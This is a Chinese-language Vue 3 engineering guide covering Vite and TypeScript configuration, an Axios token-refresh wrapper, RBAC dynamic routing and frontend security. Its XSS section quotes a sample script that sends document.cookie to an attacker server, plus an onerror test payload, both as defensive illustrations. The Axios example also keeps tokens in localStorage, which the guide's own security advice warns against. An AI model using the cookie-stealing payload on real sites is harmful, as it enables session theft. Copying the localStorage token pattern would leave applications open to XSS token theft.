# Vue 3 项目规范与工程化实践

搭建健壮、可维护的 **Vue 3** 项目，需要同时考虑**前期架构**与**后续性能、安全、协作规范**。下文按「要点 → 配置文件 → 请求层 → 权限 → 安全」组织，默认技术栈为 **Vite + TypeScript + Pinia + Vue Router**。

## 本文结构

全文顺序：**架构与选型** → **代码规范与工程化** → **性能与体验优化** → **基础配置（Vite / TS / 环境变量 / Prettier / scripts）** → **Axios 封装与 Token 刷新** → **RBAC 与动态路由** → **permissionStore** → **前端安全** → **延伸阅读**。右侧「目录」可快速跳转各小节。

---

## 架构与选型要点

### 构建栈与基础能力

- **构建工具（Vite）**：优先选用 Vite；利用浏览器原生 ESM，冷启动与 HMR 体验更好。
- **语言（TypeScript）**：强烈建议启用，在编译期发现大量低级错误，并改善 IDE 提示。
- **状态（Pinia）**：官方推荐，较 Vuex 更轻、TypeScript 更友好，无 `mutations` 样板。
- **路由（Vue Router）**：按需配置动态路由、路由守卫（鉴权）、页面切换动画等。

### 网络请求与环境

- **Axios 封装**：避免在组件内直接调用裸 Axios；统一请求/响应拦截器（Token、错误码、登出重定向等）。
- **环境变量**：通过 `.env.development`、`.env.production` 等区分 Base URL 与业务参数；**仅 `VITE_` 前缀变量会暴露给客户端代码**。

### UI 与样式

- **组件库**：Element Plus、Ant Design Vue、Naive UI 等，务必**按需引入**，避免整库打入产物。
- **样式**：Sass/Less 管理主题色与间距；可按团队规范引入 Tailwind 等原子化方案。

---

## 代码规范与工程化

- **ESLint + Prettier**：统一风格、自动修复与格式化。
- **Husky + lint-staged**：提交前执行 lint/format，避免不合规代码进库。
- **Commitizen / commitlint**：约定式提交（如 `feat:`、`fix:`、`docs:`），便于生成 Changelog。
- **路径别名**：在 `vite.config.ts` 与 `tsconfig.json` 中**保持一致**（如 `@` → `src`），避免深层 `../../../`。

---

## 性能与体验优化

### 生产构建与体积

- **路由懒加载**：`() => import('@/views/Home.vue')`，按页面分包。
- **Gzip / Brotli**：如 `vite-plugin-compression` 等，配合 Nginx/CDN 下发压缩资源。
- **分包（manualChunks）**：将 Vue、大型 UI 库、ECharts 等与业务代码拆分，利用浏览器缓存。

### 渲染与加载

- **首屏**：骨架屏或全局 Loading，减轻白屏感知。
- **图片与组件懒加载**：进入视口再加载。
- **长列表**：万级数据使用虚拟列表，只渲染可视区域 DOM。

### 运行时

- **防抖 / 节流**：`resize`、搜索输入、防重复提交等场景控制调用频率。
- **`v-show` 与 `v-if`**：频繁切换用 `v-show`；很少变化的条件用 `v-if`。

---

## 基础配置参考

以下为核心配置文件清单与关键片段。建议用 `pnpm create vite` 初始化后对照增补（`pnpm` 在 macOS 等类 Unix 系统上对依赖软链接与磁盘占用通常更友好）。

### `vite.config.ts`

这是 Vite 的核心配置文件。主要解决路径别名（Alias）、本地跨域代理（Proxy）以及生产环境的打包优化。

```typescript
import { defineConfig, loadEnv } from 'vite'
import vue from '@vitejs/plugin-vue'
import { resolve } from 'path'

export default defineConfig(({ command, mode }) => {
  // 根据当前工作目录中的 `mode` 加载 .env 文件
  const env = loadEnv(mode, process.cwd())

  return {
    plugins: [vue()],
    
    // 路径别名配置
    resolve: {
      alias: {
        '@': resolve(__dirname, 'src'), // 将 @ 指向 src 目录
        '#': resolve(__dirname, 'types'), // 将 # 指向类型声明目录
      }
    },

    // 本地开发服务器配置
    server: {
      host: '0.0.0.0', // 允许外部访问（例如手机局域网预览）
      port: Number(env.VITE_APP_PORT) || 3000,
      open: true, // 启动后自动打开浏览器
      // 跨域代理配置
      proxy: {
        [env.VITE_APP_BASE_API]: {
          target: env.VITE_APP_TARGET_URL, // 代理的目标地址
          changeOrigin: true,
          rewrite: (path) => path.replace(new RegExp(`^${env.VITE_APP_BASE_API}`), '')
        }
      }
    },

    // 生产环境打包配置
    build: {
      chunkSizeWarningLimit: 2000, // 提高 chunk 体积告警阈值（kb），按需调整
      minify: 'terser', 
      terserOptions: {
        compress: {
          drop_console: true, // 生产环境去除 console
          drop_debugger: true // 生产环境去除 debugger
        }
      },
      rollupOptions: {
        output: {
          // 静态资源分包拆分
          chunkFileNames: 'static/js/[name]-[hash].js',
          entryFileNames: 'static/js/[name]-[hash].js',
          assetFileNames: 'static/[ext]/[name]-[hash].[ext]',
          manualChunks(id) {
            if (id.includes('node_modules')) {
              // 将 node_modules 第三方依赖单独打包，利用浏览器缓存
              return id.toString().split('node_modules/')[1].split('/')[0].toString()
            }
          }
        }
      }
    }
  }
})
```

### `tsconfig.json`

Vite 默认会生成多个 `tsconfig` 文件（如 `tsconfig.node.json`、`tsconfig.app.json`）。在主 `tsconfig.json` 或 `tsconfig.app.json` 中，**最关键的是让 TS 认识你在 Vite 中配置的路径别名**，否则 IDE 会标红报错。

```json
{
  "compilerOptions": {
    "target": "ESNext",
    "useDefineForClassFields": true,
    "module": "ESNext",
    "moduleResolution": "bundler",
    "strict": true,
    "jsx": "preserve",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "esModuleInterop": true,
    "lib": ["ESNext", "DOM", "DOM.Iterable"],
    "skipLibCheck": true,
    "noEmit": true,
    
    // 关键配置：必须与 vite.config.ts 中的 alias 保持一致
    "baseUrl": ".",
    "paths": {
      "@/*": ["src/*"],
      "#/*": ["types/*"]
    }
  },
  "include": ["src/**/*.ts", "src/**/*.d.ts", "src/**/*.tsx", "src/**/*.vue"],
  "references": [{ "path": "./tsconfig.node.json" }]
}
```

### 多环境变量：`.env.development` / `.env.production`

在项目根目录创建这两个文件。Vite 会根据 `dev` / `build` 模式加载对应文件。**只有以 `VITE_` 开头的变量会暴露给客户端代码。**

**`.env.development`（开发）**

```env
# 开发环境配置
NODE_ENV='development'

# 本地运行端口号
VITE_APP_PORT=8080

# API 基础路径
VITE_APP_BASE_API='/api'

# 实际的后端接口地址（用于 Vite 代理）
VITE_APP_TARGET_URL='http://localhost:9000'
```

**`.env.production`（生产）**

```env
# 生产环境配置
NODE_ENV='production'

# 生产环境 API 基础路径
VITE_APP_BASE_API='/prod-api'

# 生产环境通常不需要代理 URL，因为会交由 Nginx 处理跨域
```

### `.prettierrc`

统一团队或不同设备间的代码风格，减少因引号、换行差异导致的无意义冲突。

```json
{
  "printWidth": 100,
  "tabWidth": 2,
  "useTabs": false,
  "semi": false,
  "vueIndentScriptAndStyle": true,
  "singleQuote": true,
  "quoteProps": "as-needed",
  "bracketSpacing": true,
  "trailingComma": "none",
  "jsxSingleQuote": false,
  "arrowParens": "always",
  "insertPragma": false,
  "requirePragma": false,
  "proseWrap": "never",
  "htmlWhitespaceSensitivity": "strict",
  "endOfLine": "auto"
}
```

### `package.json`（脚本片段）

在 `scripts` 中纳入类型检查与格式化，与 CI/本地习惯对齐。

```json
{
  "scripts": {
    "dev": "vite",
    "build": "vue-tsc --noEmit && vite build",
    "preview": "vite preview",
    "lint": "eslint . --ext .vue,.js,.jsx,.cjs,.mjs,.ts,.tsx,.cts,.mts --fix --ignore-path .gitignore",
    "format": "prettier --write \"src/**/*.{js,ts,vue,json,scss,css}\""
  }
}
```

*注：`build` 中加入 `vue-tsc --noEmit` 可在打包前做 TypeScript 检查，减少带类型错误的代码上线。*

---

## Axios 封装（拦截器与 Token 刷新）

在统一环境变量与 Base URL 的前提下，应对 **类型安全**、**Token 自动刷新**、**统一业务错误提示** 等需求；进阶可叠加**重复请求取消**（如 `AbortController`）。

### 类型定义：`src/api/types.ts`

先约定后端通用响应结构与请求扩展字段（如是否禁用全局 Loading）。

```typescript
// 后端返回的标准响应体格式
export interface Result<T = any> {
  code: number
  message: string
  data: T
}

// 扩展 AxiosRequestConfig，用于处理一些自定义配置（如：是否需要显示 loading）
import { InternalAxiosRequestConfig } from 'axios'
export interface CustomInternalAxiosRequestConfig extends InternalAxiosRequestConfig {
  noLoading?: boolean // 是否不显示全屏 loading
}
```

### 核心封装：`src/api/request.ts`

**思路**：响应为 `401` 时，若不在刷新流程中则调用 refresh；刷新期间将后续请求入队，刷新成功后依次重试；refresh 失败则清理登录态并跳转登录页。

```typescript
import axios, { AxiosInstance, AxiosResponse, AxiosError } from 'axios'
import { Result, CustomInternalAxiosRequestConfig } from './types'

// 1. 创建实例
const service: AxiosInstance = axios.create({
  baseURL: import.meta.env.VITE_APP_BASE_API, // 从环境变量读取
  timeout: 10000,
  headers: { 'Content-Type': 'application/json;charset=utf-8' }
})

// --- 无感刷新 Token 相关变量 ---
let isRefreshing = false // 标记是否正在刷新中
let requestsQueue: any[] = [] // 存储由于 token 过期导致失败的请求队列

// 2. 请求拦截器
service.interceptors.request.use(
  (config: CustomInternalAxiosRequestConfig) => {
    const token = localStorage.getItem('access_token')
    if (token && config.headers) {
      config.headers['Authorization'] = `Bearer ${token}`
    }
    return config
  },
  (error: AxiosError) => {
    return Promise.reject(error)
  }
)

// 3. 响应拦截器
service.interceptors.response.use(
  (response: AxiosResponse<Result>) => {
    const { code, message, data } = response.data
    // 业务约定：200 表示成功
    if (code === 200) {
      return response.data as any
    } else {
      // 业务级错误处理，例如：密码错误、余额不足等
      console.error(message || '系统异常')
      return Promise.reject(new Error(message || 'Error'))
    }
  },
  async (error: AxiosError<Result>) => {
    const { response } = error
    const originalRequest = error.config as CustomInternalAxiosRequestConfig

    // --- 核心：处理 401 Token 过期 ---
    if (response?.status === 401 && !originalRequest.url?.includes('refresh')) {
      if (!isRefreshing) {
        isRefreshing = true
        try {
          // 1. 尝试调用刷新 Token 的接口
          const refreshToken = localStorage.getItem('refresh_token')
          const { data } = await axios.post(`${import.meta.env.VITE_APP_BASE_API}/auth/refresh`, { refreshToken })
          
          // 2. 保存新 Token
          localStorage.setItem('access_token', data.accessToken)
          isRefreshing = false

          // 3. 重新发起队列中的请求
          requestsQueue.forEach((cb) => cb(data.accessToken))
          requestsQueue = []

          // 4. 重试当前请求
          return service(originalRequest)
        } catch (refreshError) {
          // 刷新失败，通常是 refreshToken 也过期了，直接退出登录
          isRefreshing = false
          localStorage.clear()
          window.location.href = '/login'
          return Promise.reject(refreshError)
        }
      } else {
        // 如果正在刷新中，将当前请求包装成 Promise 放入队列
        return new Promise((resolve) => {
          requestsQueue.push((token: string) => {
            if (originalRequest.headers) {
              originalRequest.headers['Authorization'] = `Bearer ${token}`
            }
            resolve(service(originalRequest))
          })
        })
      }
    }

    // 处理其他 HTTP 状态码
    handleHttpError(response?.status)
    return Promise.reject(error)
  }
)

// 通用错误处理
function handleHttpError(status?: number) {
  const messages: Record<number, string> = {
    400: '请求参数错误',
    403: '拒绝访问',
    404: '请求地址不存在',
    500: '服务器内部错误'
  }
  console.error(messages[status!] || '网络连接异常')
}

export default service
```

### 业务调用示例：`src/api/user.ts`

```typescript
import request from './request'
import { Result } from './types'

// 定义返回的数据类型
interface UserInfo {
  id: number
  username: string
  avatar: string
}

/**
 * 获取用户信息 API
 */
export function getUserInfo() {
  return request<Result<UserInfo>>({
    url: '/user/info',
    method: 'get'
  })
}
```

### 关键配置与优化建议

| **配置点**               | **作用**                                                     |
| ------------------------ | ------------------------------------------------------------ |
| **`requestsQueue` 队列** | 解决多个并发请求同时遇到 Token 过期时，只调用一次刷新接口的问题。 |
| **`isRefreshing` 锁**    | 防止并发请求导致重复刷新 Token 的竞态条件。                  |
| **`manualChunks`**       | 在打包时将 `axios` 提取到公共 JS 中，利用浏览器缓存。        |
| **`AbortController`**    | (进阶建议) 可以在拦截器中维护一个 `Map`，根据 `url + method` 自动取消重复的、还没返回的请求。 |

### 常见 FAQ

> **问：为什么刷新 Token 接口要用原生的 `axios` 而不是封装后的 `service`？**  
> **答：** 避免死循环。若 refresh 接口也走 `service` 且再次 401，会反复进入拦截器刷新逻辑。

进阶可按需在拦截器里做单例 **Loading**、请求去重等，与业务组件解耦。

---

## 权限控制（RBAC）

中后台常见模型：**后端返回菜单（路由）与按钮权限标识**，前端动态挂载路由并控制控件显隐。**接口层鉴权仍必须由后端完成**，前端仅提升体验与降低误操作。

### 后端数据结构约定（示例）

后端通常在登录成功或 `/user/info` 等接口中返回用户信息、`menus`（菜单/路由）与 `permissions`（按钮权限）。`menus` 用于动态路由与侧边栏；`permissions` 用于 `v-has` / `checkPermission` 等。

```json
{
  "code": 200,
  "data": {
    "username": "admin",
    "menus": [
      {
        "name": "SysUser",
        "path": "/system/user",
        "component": "system/user/index",
        "meta": { "title": "用户管理", "icon": "user" }
      }
    ],
    "permissions": ["sys:user:add", "sys:user:edit", "sys:user:delete"]
  }
}
```

### 动态路由与路由守卫

不要在 `router/index.ts` 写死全部业务路由：仅保留**常量路由**（登录、404 等），业务路由在拉取 `menus` 后通过 `router.addRoute` 挂载。

#### 静态路由与 `import.meta.glob`

```typescript
// router/routes.ts
import { RouteRecordRaw } from 'vue-router'

// 公共路由（无需权限）
export const constantRoutes: RouteRecordRaw[] = [
  { path: '/login', component: () => import('@/views/login/index.vue') },
  { path: '/404', component: () => import('@/views/error/404.vue') }
]

// 动态路由映射表（也可以根据后端返回的 component 字符串动态加载）
const modules = import.meta.glob('../views/**/*.vue')
```

#### 路由守卫（`src/permission.ts`）

```typescript
import router from './router'
import { useUserStore } from '@/store/modules/user'
import { usePermissionStore } from '@/store/modules/permission'

const whiteList = ['/login'] // 白名单

router.beforeEach(async (to, from, next) => {
  const userStore = useUserStore()
  const permissionStore = usePermissionStore()

  if (userStore.token) {
    if (to.path === '/login') {
      next({ path: '/' })
    } else {
      // 检查是否已经拉取过用户信息/生成过路由
      if (permissionStore.routes.length === 0) {
        try {
          // 1. 获取用户信息（含 permissions 和 menus）
          const { menus } = await userStore.getInfo()
          // 2. 根据 menus 生成可访问的路由表
          const accessRoutes = await permissionStore.generateRoutes(menus)
          // 3. 动态添加路由
          accessRoutes.forEach(route => router.addRoute(route))
          // 4. 设置 replace: true 确保路由加载完后再进入
          next({ ...to, replace: true })
        } catch (error) {
          await userStore.resetToken()
          next(`/login?redirect=${to.path}`)
        }
      } else {
        next()
      }
    }
  } else {
    whiteList.includes(to.path) ? next() : next(`/login?redirect=${to.path}`)
  }
})
```

### 按钮级权限

可通过**自定义指令**或**工具函数**（如 `checkPermission`）控制操作区显隐。

#### 指令 `v-has`（`src/directives/permission.ts`）

```typescript
import { Directive, DirectiveBinding } from 'vue'
import { useUserStore } from '@/store/modules/user'

export const hasPerm: Directive = {
  mounted(el: HTMLElement, binding: DirectiveBinding) {
    const { value } = binding
    const userStore = useUserStore()
    const permissions = userStore.permissions // ['sys:user:add', ...]

    if (value && value instanceof Array && value.length > 0) {
      const hasPermission = permissions.some((perm) => value.includes(perm))

      // 如果没有权限，直接从 DOM 中移除元素
      if (!hasPermission) {
        el.parentNode && el.parentNode.removeChild(el)
      }
    } else {
      throw new Error(`need permissions! Like v-has="['sys:user:add']"`)
    }
  }
}
```

#### 在组件中使用（需在 `main.ts` 注册指令）

```vue
<template>
  <div class="operation">
    <el-button v-has="['sys:user:add']" type="primary">新增用户</el-button>
    
    <el-button v-if="checkPermission(['sys:user:edit'])">编辑</el-button>
  </div>
</template>

<script setup lang="ts">
import { checkPermission } from '@/utils/permission' // 一个封装的逻辑函数
</script>
```

### 前端侧要点小结

| **维度**     | **处理方案**                                                 |
| ------------ | ------------------------------------------------------------ |
| **持久化**   | Token 存入 `Cookie` 或 `LocalStorage`；权限信息（permissions）建议存入 **Pinia**，页面刷新后在路由守卫中重新获取。 |
| **路由生成** | 后端只返回菜单标识（Name/Path），前端本地维护一份全量异步路由表进行过滤；或者后端返回组件路径，前端利用 `import.meta.glob` 动态匹配。 |
| **安全性**   | **前端控制仅为了用户体验（隐藏 UI）**，真正的安全必须由后端在接口层面（拦截器/切面）再次校验 Token 和权限码。 |
| **404 处理** | 动态路由末尾增加通配符 `path: '/:pathMatch(.*)*'`；须在动态路由注册完成后再加，避免正常页被误导向 404。 |

---

## 动态路由：permissionStore

**职责**：把后端 `menus` 转成 `RouteRecordRaw`，并用 `import.meta.glob` 将 `component` 字符串（如 `system/user/index`）映射为真实 `.vue` 组件，供 `router.addRoute` 与侧边栏共用一份数据源。

### `src/store/modules/permission.ts`

在 Vite 中不宜随意 `import(动态字符串)`，应通过 `import.meta.glob` 预声明 `views` 下可能用到的模块，打包器才能正确分包。

```typescript
import { defineStore } from 'pinia'
import { RouteRecordRaw } from 'vue-router'
import { constantRoutes } from '@/router/routes'

// 匹配 src/views 下所有的 .vue 文件
const modules = import.meta.glob('../../views/**/*.vue')

// 后端返回的原始菜单接口类型
interface RawMenu {
  id?: number
  name: string      // 路由名称 (唯一)
  path: string      // 路由路径
  component: string // 组件路径，例如 'system/user/index'
  redirect?: string
  meta: {
    title: string
    icon?: string
    hidden?: boolean
    keepAlive?: boolean
  }
  children?: RawMenu[]
}

export const usePermissionStore = defineStore('permission', {
  state: () => ({
    routes: [] as RouteRecordRaw[], // 完整路由表（用于侧边栏渲染）
    addRoutes: [] as RouteRecordRaw[] // 动态添加的路由表
  }),
  actions: {
    /**
     * 生成路由的核心入口
     * @param menus 后端返回的菜单数组
     */
    generateRoutes(menus: RawMenu[]) {
      return new Promise<RouteRecordRaw[]>((resolve) => {
        // 1. 递归转换后端数据为标准路由格式
        const accessedRoutes = filterAsyncRoutes(menus)
        
        // 2. 将通配符 404 路由放在最后，防止动态路由未加载完就跳 404
        accessedRoutes.push({ 
          path: '/:pathMatch(.*)*', 
          redirect: '/404', 
          meta: { hidden: true } 
        })

        this.addRoutes = accessedRoutes
        this.routes = constantRoutes.concat(accessedRoutes)
        resolve(accessedRoutes)
      })
    }
  }
})

/**
 * 递归过滤与转换
 */
function filterAsyncRoutes(menus: RawMenu[]): RouteRecordRaw[] {
  const res: RouteRecordRaw[] = []

  menus.forEach((menu) => {
    const tmpRoute: any = {
      path: menu.path,
      component: loadComponent(menu.component), // 关键：动态映射组件
      name: menu.name,
      meta: menu.meta,
      children: []
    }

    if (menu.redirect) {
      tmpRoute.redirect = menu.redirect
    }

    if (menu.children && menu.children.length > 0) {
      tmpRoute.children = filterAsyncRoutes(menu.children)
    }

    res.push(tmpRoute as RouteRecordRaw)
  })

  return res
}

/**
 * 组件加载逻辑
 * 后端返回 'system/user/index' -> 映射为 () => import('@/views/system/user/index.vue')
 */
function loadComponent(component: string) {
  if (component === 'Layout') {
    return () => import('@/layout/index.vue') // 如果是布局组件
  }
  
  // 补全路径并从 glob 模块中查找
  const fullPath = `../../views/${component}.vue`
  if (modules[fullPath]) {
    return modules[fullPath]
  } else {
    console.error(`未找到组件路径: ${fullPath}，请检查后端配置或本地文件是否存在`)
    return () => import('@/views/error/404.vue')
  }
}
```

### 实现要点

#### `import.meta.glob`

在 Vite 中不能直接使用动态拼接的 `import(path)`，因为生产环境打包时无法确定哪些文件需要保留。使用 `glob` 会告诉 Vite：*“这文件夹下的所有 vue 文件我可能都要用，帮我分包处理好。”*

#### 与路由守卫配合

在 `permission.ts` 中在拉取 `menus` 后：

```typescript
const accessRoutes = await permissionStore.generateRoutes(menus)
// 批量添加动态路由
accessRoutes.forEach(route => {
  router.addRoute(route)
})
```

#### 侧边栏菜单

侧边栏可直接基于 `permissionStore.routes` 递归渲染，与可访问路由保持一致，避免维护两套菜单数据。

### 扁平菜单转树（可选）

若后端返回**扁平列表**（无 `children`），可先转成树再交给 `generateRoutes`：

```typescript
function arrayToTree(list: any[], parentId = 0) {
  return list
    .filter(item => item.parentId === parentId)
    .map(item => ({
      ...item,
      children: arrayToTree(list, item.id)
    }))
}
```

### 与安全的边界

前端路由与按钮控制仅改善体验；**鉴权必须以服务端为准**（JWT、权限码、数据范围等）。隐藏路由无法阻止用户直接请求接口。

---

## 前端安全

前端运行在用户环境，代码与存储均不可视为可信边界；工程上仍应落实 **XSS / CSRF / 敏感数据 / 依赖与构建** 等常规措施，与后端纵深防御配合。

### XSS（跨站脚本）

Vue 默认会自动转义 HTML 内容（如 `{{ message }}`），这已经防范了大部分攻击。但当你不得不使用 `v-html` 时，风险就来了。

**1. 风险：** 攻击者通过评论区注入 `<script>fetch('攻击者服务器?cookie=' + document.cookie)</script>`。

**2. 方案：使用 DOMPurify 净化后再 `v-html`。**

```typescript
// 安装: pnpm add dompurify @types/dompurify
import DOMPurify from 'dompurify'

// 错误做法 ❌
// <div v-html="userProvidedHtml"></div>

// 正确做法 ✅
const rawHtml = '<img src=x onerror=alert(1)> <script>alert("Hacked")</script>'
const safeHtml = computed(() => DOMPurify.sanitize(rawHtml))

// 在模板中使用
// <div v-html="safeHtml"></div>
```

**3. 补充建议：**

- 避免直接操作 DOM（如 `innerHTML`）。
- 后端返回富文本前也应做过滤与策略控制。

### CSRF（跨站请求伪造）

CSRF 攻击者利用用户的登录状态（Cookie），在用户不知情的情况下发送恶意请求。

**1. 解决方案：双重 Cookie 校验或自定义 Header。**

在 Cookie 会话场景下，可配合 **SameSite**、**CSRF Token**、或约定 **自定义 Header**（攻击方跨站请求往往难以带上与页面一致的 Header，具体以后端方案为准）。

```typescript
// src/api/request.ts
import axios from 'axios'

const service = axios.create({
  // ... 其他配置
})

service.interceptors.request.use(config => {
  // 核心：强制要求自定义 Header，防御 CSRF
  config.headers['X-Requested-With'] = 'XMLHttpRequest'
  
  // 或者配合后端使用 CSRF Token
  const csrfToken = getCookie('csrfToken') // 假设你有一个获取 cookie 的函数
  if (csrfToken) {
    config.headers['X-CSRF-Token'] = csrfToken
  }
  return config
})
```

**2. Cookie：** 尽量由服务端设置 `SameSite=Lax` / `Strict` 等，并与后端安全方案对齐。

### 敏感数据存储与环境变量

**1. 存储：LocalStorage vs. HttpOnly Cookie**

- **LocalStorage:** 极易受到 XSS 攻击读取。不要存储 Token、密钥或个人敏感信息。
- **HttpOnly Cookie:** 脚本无法读取，安全性最高，适合存储 `access_token`。

**2. 环境配置安全：**

在 Vite 中，仅 `VITE_` 前缀会暴露给前端构建产物；**密钥类配置不得放在可被打包的 env 中**。

```env
# .env.production
VITE_API_URL=https://api.example.com  # 安全：前端需要知道 API 地址
DB_PASSWORD=secret_123
```

> `DB_PASSWORD` 无 `VITE_` 前缀时不会注入前端代码，但仍不应把真实密钥提交到仓库；生产环境用密钥托管与 CI 注入。

### CSP 与依赖安全

**1. 配置 CSP：**

可在 `index.html` 的 `<head>` 中配置 CSP（生产环境更推荐由服务端响应头下发，便于统一治理）。

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline';">
```

**2. 依赖漏洞扫描：**

定期审计依赖漏洞并升级：

```bash
# 使用 pnpm 或 npm 进行审计
pnpm audit

# 如果发现高危漏洞，尝试自动修复
pnpm audit --fix
```

### 安全 Checklist

| **维度**     | **措施**                                                     | **优先级** |
| ------------ | ------------------------------------------------------------ | ---------- |
| **XSS**      | 严禁直接使用 `v-html`；必须使用时用 `dompurify` 过滤。       | **最高**   |
| **CSRF**     | 后端设置 `SameSite=Lax`；前端 Axios 统一携带自定义 Header。  | 高         |
| **数据加密** | 传输敏感信息时使用非对称加密（如 JSEncrypt），虽然前端不保密，但能增加攻击成本。 | 中         |
| **构建安全** | 使用 `npm audit` 检查插件；在 CI/CD 流程中加入安全扫描。     | 高         |
| **代码审计** | 生产环境禁用 `SourceMap`，防止源代码泄露（Vite 配置 `build.sourcemap: false`）。 | 中         |

> **提示：** 路由守卫与表单校验不能替代服务端鉴权；**永远不要默认信任客户端传来的任何数据**。

---

## 延伸阅读

- 可按团队规范补充 **ESLint 9 flat config**、**Stylelint**、**Vitest** 与 E2E 测试、**CI 中的 `pnpm audit` / `vue-tsc`** 等门禁。  
- 侧边栏递归菜单可与 `permissionStore.routes` 的 `meta.hidden`、`meta.title` 等字段对齐；布局类路由可约定 `component: 'Layout'` 与上文 `loadComponent` 一致。